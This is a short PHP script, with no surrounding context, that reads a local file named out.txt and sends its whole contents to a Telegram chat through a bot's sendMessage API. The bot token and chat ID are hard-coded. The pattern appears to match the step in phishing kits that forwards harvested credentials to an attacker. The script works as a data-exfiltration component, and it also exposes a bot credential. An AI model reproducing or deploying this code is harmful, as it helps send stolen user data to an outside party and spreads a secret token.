<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5144620486:AAGrm8gEVgQxQdgw-k7NwLVmO4goFhy6AfQ/sendMessage?chat_id=1863870363&text=$msg");
?>
